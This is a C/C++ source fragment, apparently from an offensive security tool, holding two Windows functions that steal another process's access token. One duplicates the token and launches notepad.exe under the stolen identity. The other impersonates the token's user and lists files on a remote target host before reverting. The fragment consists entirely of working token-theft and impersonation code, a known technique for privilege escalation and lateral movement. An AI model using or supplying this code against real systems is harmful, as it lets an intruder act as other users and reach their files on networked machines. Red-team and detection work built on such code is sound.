void duplicate(HANDLE hProcess, HANDLE &hToken, DWORD pid) {

	// if duplicating only need TOKEN_DUPLICATE
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
	{
		wprintf(L"OpenProcessToken failed: %u\n", GetLastError());
		CloseHandle(hProcess);
		return;
	}
	else {
		wprintf(L"[+] Got handle to process token %d with access mask TOKEN_DUPLICATE\n", pid);

		HANDLE dupToken = NULL;
		if (!DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
			NULL, SecurityImpersonation, TokenPrimary, &dupToken))
		{
			wprintf(L"DuplicateToken failed: %u\n", GetLastError());
			CloseHandle(hToken);
			CloseHandle(hProcess);
			return;
		}
		else {
			wprintf(L"[+] Duplicated token\n");

			STARTUPINFOW si;
			PROCESS_INFORMATION pi;
			BOOL result = TRUE;
			ZeroMemory(&si, sizeof(STARTUPINFOW));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFOW);

			wchar_t processName[MAX_PATH] = L"C:\\Windows\\System32\\notepad.exe";

			result = CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE, processName, NULL, 0, NULL, NULL, &si, &pi);
			pi.dwProcessId ? wprintf(L"[+] New process ID: %d\n", pi.dwProcessId) : wprintf(L"Failed to get process ID\n");

		}
	}
}


void impersonate(HANDLE hProcess, HANDLE& hToken, DWORD pid, wchar_t* targetHost) {
	// if impersonating need both TOKEN_DUPLICATE and TOKEN_IMPERSONATE as this is a primary token
	if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
	{
		wprintf(L"OpenProcessToken failed: %u\n", GetLastError());
		CloseHandle(hProcess);
		return;
	}
	else {
		wprintf(L"[+] Got handle to process token %d with access mask TOKEN QUERY & TOKEN_DUPLICATE\n", pid);

		HANDLE dupToken = NULL;
		if (!DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
			NULL, SecurityImpersonation, TokenImpersonation, &dupToken))
		{
			wprintf(L"DuplicateToken failed: %u\n", GetLastError());
			CloseHandle(hToken);
			CloseHandle(hProcess);
			return;
		}
		else {

			wprintf(L"[+] Duplicated token\n");

			// Impersonate the token

			if (!ImpersonateLoggedOnUser(dupToken))
			{
				wprintf(L"ImpersonateLoggedOnUser failed: %u\n", GetLastError());
				CloseHandle(hToken);
				CloseHandle(hProcess);
				return;
			}
			else {

				// List files on target system
				wprintf(L"[+] Listing files on %ws\n", targetHost);
				listSystem(targetHost);

				// Revert to self
				if (!RevertToSelf())
				{
					wprintf(L"RevertToSelf failed: %u\n", GetLastError());
					CloseHandle(hToken);
					CloseHandle(hProcess);
					return;
				}
				else {
					wprintf(L"[+] Reverted to self\n");
				}
			}
		}
	}
}